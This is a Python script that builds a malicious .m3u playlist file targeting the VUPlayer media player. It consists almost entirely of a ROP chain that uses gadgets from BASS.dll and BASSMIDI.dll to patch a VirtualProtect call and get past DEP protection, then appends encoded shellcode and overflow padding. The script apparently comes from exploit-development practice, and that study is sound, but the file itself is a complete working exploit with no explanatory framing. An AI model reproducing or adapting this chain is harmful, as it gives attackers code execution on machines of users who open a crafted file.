import sys
import struct
import os

crash_file = "vuplayer-dep.m3u"

rop_nop = struct.pack("<I",0x1060e075)
#step 1 - saving esp in EAX & EDX
rop = struct.pack('<L', 0x10010405)  # PUSH ESP # POP EDI # POP ESI # RETN    ** [BASS.dll] **   |  ascii {PAGE_EXECUTE_READWRITE}
rop += struct.pack('<L',0x41414141) # padding for pop esi
rop += struct.pack('<L', 0x100171d8)  # MOV EAX,EDI # POP EDI # POP ESI # RETN    ** [BASS.dll] ** 
rop += struct.pack('<L',0x41414141) # padding for pop edi
rop += struct.pack('<L',0x41414141) # padding for pop esi
rop += struct.pack('<L', 0x10038a6d)  # XCHG EAX,EDX # RETN    ** 
rop += struct.pack('<L', 0x10607ebe)  # MOV EAX,EDX # RETN    ** [BASSMIDI.dll] **

#step 2 jumping over template
rop += struct.pack('<L', 0x1010162e)  # ADD ESP,20 # RETN    ** [BASSWMA.dll] **

rop += struct.pack('<L', 0x10040284)    # kernel32.VirtualProtect()
rop += struct.pack('<L', 0x4c4c4c4c)    # return address (address of shellcode, or where to jump after VirtualProtect call. Not officially apart of the "parameters"
rop += struct.pack('<L', 0x45454545)    # lpAddress
rop += struct.pack('<L', 0x03030303)    # size of shellcode
rop += struct.pack('<L', 0x54545454)    # flNewProtect
rop += struct.pack('<L', 0x10040f26)    # pOldProtect (any writeable address) - ci sto? sembra piccolo

rop += b"\x90" * 8 # padding

#patching VirtualProtect
rop += struct.pack('<L', 0x10014474)  # ADD EAX,4 # RETN    ** [BASS.dll] **
rop += struct.pack('<L', 0x10014474)  # ADD EAX,4 # RETN    ** [BASS.dll] **
rop += struct.pack('<L', 0x10014474)  # ADD EAX,4 # RETN    ** [BASS.dll] **
rop += struct.pack('<L', 0x10014474)  # ADD EAX,4 # RETN    ** [BASS.dll] **
rop += struct.pack('<L', 0x10014474)  # ADD EAX,4 # RETN    ** [BASS.dll] **
rop += struct.pack('<L', 0x10014474)  # ADD EAX,4 # RETN    ** [BASS.dll] **
rop += struct.pack('<L', 0x10014474)  # ADD EAX,4 # RETN    ** [BASS.dll] **
rop += struct.pack('<L', 0x10038a6d)  # XCHG EAX,EDX # RETN    ** 
rop += struct.pack('<L', 0x10607ebe)  # MOV EAX,EDX # RETN    ** [BASSMIDI.dll] **
rop += struct.pack('<L', 0x1004041c)  # POP EDX # RETN    ** [BASS.dll] **   |
rop += struct.pack('<L', 0xffffffff) #-1
rop += struct.pack('<L', 0x100332eb)  # INC EDX # RETN    ** [BASS.dll] **
rop += struct.pack('<L', 0x10101004)  # PUSH EAX # ADC BYTE PTR [EAX],DL # POP ECX # RETN  
rop += struct.pack('<L', 0x1001eaf1)  # MOV EAX,DWORD PTR [EAX] # RETN  
rop += struct.pack('<L', 0x1001eaf1)  # MOV EAX,DWORD PTR [EAX] # RETN  
rop += struct.pack('<L', 0x1010306c)  # MOV DWORD PTR [ECX],EAX # XOR EAX,EAX # RETN 0x08  
rop += rop_nop # padding for retn 0x08
rop += rop_nop # padding for retn 0x08
rop += rop_nop # padding for retn 0x08

#patching return address
rop += struct.pack('<L', 0x10015fe0)  # INC ECX # RETN 
rop += struct.pack('<L', 0x10015fe0)  # INC ECX # RETN 
rop += struct.pack('<L', 0x10015fe0)  # INC ECX # RETN 
rop += struct.pack('<L', 0x10015fe0)  # INC ECX # RETN 
rop += struct.pack('<L', 0x10602fd4)  # MOV EAX,ECX # RETN    ** [BASSMIDI.dll] ** 
rop += struct.pack('<L', 0x1001fc81)  # ADD EAX,58 # RETN 0x04    ** [BASS.dll] ** 
rop += rop_nop # padding for retn 0x04
rop += rop_nop # padding for retn 0x04
rop += struct.pack('<L', 0x1001fc81)  # ADD EAX,58 # RETN 0x04    ** [BASS.dll] ** 
rop += rop_nop # padding for retn 0x04
rop += rop_nop # padding for retn 0x04
rop += struct.pack('<L', 0x1001fc81)  # ADD EAX,58 # RETN 0x04    ** [BASS.dll] ** 
rop += rop_nop # padding for retn 0x04
rop += rop_nop # padding for retn 0x04
rop += struct.pack('<L', 0x1001fc81)  # ADD EAX,58 # RETN 0x04    ** [BASS.dll] ** 
rop += rop_nop # padding for retn 0x04
rop += rop_nop # padding for retn 0x04
rop += struct.pack('<L', 0x1001fc81)  # ADD EAX,58 # RETN 0x04    ** [BASS.dll] ** 
rop += rop_nop # padding for retn 0x04
rop += rop_nop # padding for retn 0x04
rop += struct.pack('<L', 0x1001fc81)  # ADD EAX,58 # RETN 0x04    ** [BASS.dll] ** 
rop += rop_nop # padding for retn 0x04
rop += rop_nop # padding for retn 0x04
rop += struct.pack('<L', 0x1010306c)  # MOV DWORD PTR [ECX],EAX # XOR EAX,EAX # RETN 0x08  
rop += rop_nop # padding for retn 0x08
rop += rop_nop # padding for retn 0x08
rop += rop_nop # padding for retn 0x08

#patching lpAddress
rop += struct.pack('<L', 0x10015fe0)  # INC ECX # RETN 
rop += struct.pack('<L', 0x10015fe0)  # INC ECX # RETN 
rop += struct.pack('<L', 0x10015fe0)  # INC ECX # RETN 
rop += struct.pack('<L', 0x10015fe0)  # INC ECX # RETN 
rop += struct.pack('<L', 0x10602fd4)  # MOV EAX,ECX # RETN    ** [BASSMIDI.dll] ** 
rop += struct.pack('<L', 0x1001fc81)  # ADD EAX,58 # RETN 0x04    ** [BASS.dll] ** 
rop += rop_nop # padding for retn 0x04
rop += rop_nop # padding for retn 0x04
rop += struct.pack('<L', 0x1001fc81)  # ADD EAX,58 # RETN 0x04    ** [BASS.dll] ** 
rop += rop_nop # padding for retn 0x04
rop += rop_nop # padding for retn 0x04
rop += struct.pack('<L', 0x1001fc81)  # ADD EAX,58 # RETN 0x04    ** [BASS.dll] ** 
rop += rop_nop # padding for retn 0x04
rop += rop_nop # padding for retn 0x04
rop += struct.pack('<L', 0x1001fc81)  # ADD EAX,58 # RETN 0x04    ** [BASS.dll] ** 
rop += rop_nop # padding for retn 0x04
rop += rop_nop # padding for retn 0x04
rop += struct.pack('<L', 0x1001fc81)  # ADD EAX,58 # RETN 0x04    ** [BASS.dll] ** 
rop += rop_nop # padding for retn 0x04
rop += rop_nop # padding for retn 0x04
rop += struct.pack('<L', 0x1001fc81)  # ADD EAX,58 # RETN 0x04    ** [BASS.dll] ** 
rop += rop_nop # padding for retn 0x04
rop += rop_nop # padding for retn 0x04
rop += struct.pack('<L',0x1003a083)  # DEC EAX # RETN    ** [BASS.dll] ** 
rop += struct.pack('<L',0x1003a083)  # DEC EAX # RETN    ** [BASS.dll] ** 
rop += struct.pack('<L',0x1003a083)  # DEC EAX # RETN    ** [BASS.dll] ** 
rop += struct.pack('<L',0x1003a083)  # DEC EAX # RETN    ** [BASS.dll] ** 
rop += struct.pack('<L', 0x1010306c)  # MOV DWORD PTR [ECX],EAX # XOR EAX,EAX # RETN 0x08  
rop += rop_nop # padding for retn 0x08
rop += rop_nop # padding for retn 0x08
rop += rop_nop # padding for retn 0x08

#patching size
rop += struct.pack('<L', 0x10015fe0)  # INC ECX # RETN 
rop += struct.pack('<L', 0x10015fe0)  # INC ECX # RETN 
rop += struct.pack('<L', 0x10015fe0)  # INC ECX # RETN 
rop += struct.pack('<L', 0x10015fe0)  # INC ECX # RETN 
rop += struct.pack('<L', 0x10015f82)  # POP EAX # RETN    ** [BASS.dll] **   | 
rop += struct.pack('<L', 0xfffffbff) #-401
rop += struct.pack('<L', 0x10014db4)  # NEG EAX # RETN    ** [BASS.dll] ** 
rop += struct.pack('<L', 0x1010306c)  # MOV DWORD PTR [ECX],EAX # XOR EAX,EAX # RETN 0x08  
rop += rop_nop # padding for retn 0x08
rop += rop_nop # padding for retn 0x08
rop += rop_nop # padding for retn 0x08

#patching flProtect
rop += struct.pack('<L', 0x10015fe0)  # INC ECX # RETN 
rop += struct.pack('<L', 0x10015fe0)  # INC ECX # RETN 
rop += struct.pack('<L', 0x10015fe0)  # INC ECX # RETN 
rop += struct.pack('<L', 0x10015fe0)  # INC ECX # RETN 
rop += struct.pack('<L', 0x10015f82)  # POP EAX # RETN    ** [BASS.dll] **   | 
rop += struct.pack('<L', 0xffffffc0) #-40
rop += struct.pack('<L', 0x10014db4)  # NEG EAX # RETN    ** [BASS.dll] ** 
rop += struct.pack('<L', 0x1010306c)  # MOV DWORD PTR [ECX],EAX # XOR EAX,EAX # RETN 0x08  
rop += rop_nop # padding for retn 0x08
rop += rop_nop # padding for retn 0x08
rop += rop_nop # padding for retn 0x08

#switching to esp
rop += struct.pack('<L', 0x1003314a)  # DEC ECX # RETN    ** [BASS.dll] **   | 
rop += struct.pack('<L', 0x1003314a)  # DEC ECX # RETN    ** [BASS.dll] **   | 
rop += struct.pack('<L', 0x1003314a)  # DEC ECX # RETN    ** [BASS.dll] **   | 
rop += struct.pack('<L', 0x1003314a)  # DEC ECX # RETN    ** [BASS.dll] **   | 
rop += struct.pack('<L', 0x1003314a)  # DEC ECX # RETN    ** [BASS.dll] **   | 
rop += struct.pack('<L', 0x1003314a)  # DEC ECX # RETN    ** [BASS.dll] **   | 
rop += struct.pack('<L', 0x1003314a)  # DEC ECX # RETN    ** [BASS.dll] **   | 
rop += struct.pack('<L', 0x1003314a)  # DEC ECX # RETN    ** [BASS.dll] **   | 
rop += struct.pack('<L', 0x1003314a)  # DEC ECX # RETN    ** [BASS.dll] **   | 
rop += struct.pack('<L', 0x1003314a)  # DEC ECX # RETN    ** [BASS.dll] **   | 
rop += struct.pack('<L', 0x1003314a)  # DEC ECX # RETN    ** [BASS.dll] **   | 
rop += struct.pack('<L', 0x1003314a)  # DEC ECX # RETN    ** [BASS.dll] **   | 
rop += struct.pack('<L', 0x1003314a)  # DEC ECX # RETN    ** [BASS.dll] **   | 
rop += struct.pack('<L', 0x1003314a)  # DEC ECX # RETN    ** [BASS.dll] **   | 
rop += struct.pack('<L', 0x1003314a)  # DEC ECX # RETN    ** [BASS.dll] **   | 
rop += struct.pack('<L', 0x1003314a)  # DEC ECX # RETN    ** [BASS.dll] **   | 
rop += struct.pack('<L', 0x10602fd4)  # MOV EAX,ECX # RETN    ** [BASSMIDI.dll] ** 
rop += struct.pack('<L', 0x10606397)  # XCHG EAX,ESP # RETN    ** [BASSMIDI.dll] ** 

print(600 - len(rop))
rop += b"\x90" * (600 - len(rop))

shellcode =  b""
shellcode += b"\xbf\xf0\xe7\x80\xa3\xdb\xcb\xd9\x74\x24\xf4"
shellcode += b"\x5a\x31\xc9\xb1\x52\x31\x7a\x12\x83\xea\xfc"
shellcode += b"\x03\x8a\xe9\x62\x56\x96\x1e\xe0\x99\x66\xdf"
shellcode += b"\x85\x10\x83\xee\x85\x47\xc0\x41\x36\x03\x84"
shellcode += b"\x6d\xbd\x41\x3c\xe5\xb3\x4d\x33\x4e\x79\xa8"
shellcode += b"\x7a\x4f\xd2\x88\x1d\xd3\x29\xdd\xfd\xea\xe1"
shellcode += b"\x10\xfc\x2b\x1f\xd8\xac\xe4\x6b\x4f\x40\x80"
shellcode += b"\x26\x4c\xeb\xda\xa7\xd4\x08\xaa\xc6\xf5\x9f"
shellcode += b"\xa0\x90\xd5\x1e\x64\xa9\x5f\x38\x69\x94\x16"
shellcode += b"\xb3\x59\x62\xa9\x15\x90\x8b\x06\x58\x1c\x7e"
shellcode += b"\x56\x9d\x9b\x61\x2d\xd7\xdf\x1c\x36\x2c\x9d"
shellcode += b"\xfa\xb3\xb6\x05\x88\x64\x12\xb7\x5d\xf2\xd1"
shellcode += b"\xbb\x2a\x70\xbd\xdf\xad\x55\xb6\xe4\x26\x58"
shellcode += b"\x18\x6d\x7c\x7f\xbc\x35\x26\x1e\xe5\x93\x89"
shellcode += b"\x1f\xf5\x7b\x75\xba\x7e\x91\x62\xb7\xdd\xfe"
shellcode += b"\x47\xfa\xdd\xfe\xcf\x8d\xae\xcc\x50\x26\x38"
shellcode += b"\x7d\x18\xe0\xbf\x82\x33\x54\x2f\x7d\xbc\xa5"
shellcode += b"\x66\xba\xe8\xf5\x10\x6b\x91\x9d\xe0\x94\x44"
shellcode += b"\x31\xb0\x3a\x37\xf2\x60\xfb\xe7\x9a\x6a\xf4"
shellcode += b"\xd8\xbb\x95\xde\x70\x51\x6c\x89\xbe\x0e\x1c"
shellcode += b"\xd3\x57\x4d\xe0\xd3\x9e\xd8\x06\x79\xf1\x8c"
shellcode += b"\x91\x16\x68\x95\x69\x86\x75\x03\x14\x88\xfe"
shellcode += b"\xa0\xe9\x47\xf7\xcd\xf9\x30\xf7\x9b\xa3\x97"
shellcode += b"\x08\x36\xcb\x74\x9a\xdd\x0b\xf2\x87\x49\x5c"
shellcode += b"\x53\x79\x80\x08\x49\x20\x3a\x2e\x90\xb4\x05"
shellcode += b"\xea\x4f\x05\x8b\xf3\x02\x31\xaf\xe3\xda\xba"
shellcode += b"\xeb\x57\xb3\xec\xa5\x01\x75\x47\x04\xfb\x2f"
shellcode += b"\x34\xce\x6b\xa9\x76\xd1\xed\xb6\x52\xa7\x11"
shellcode += b"\x06\x0b\xfe\x2e\xa7\xdb\xf6\x57\xd5\x7b\xf8"
shellcode += b"\x82\x5d\x9b\x1b\x06\xa8\x34\x82\xc3\x11\x59"
shellcode += b"\x35\x3e\x55\x64\xb6\xca\x26\x93\xa6\xbf\x23"
shellcode += b"\xdf\x60\x2c\x5e\x70\x05\x52\xcd\x71\x0c"


#\x00\x09\x0a\x0d\x1a
fuzz = b"A" * 1012
fuzz += rop_nop
fuzz += rop
fuzz += shellcode
#rop_nop = struct.pack("<I",0x1060e075)

fuzz += b"C" * (3000 - len(fuzz))

#10040284 - virtual protect

makedafile = open(crash_file, "wb")
makedafile.write(fuzz)
makedafile.close()
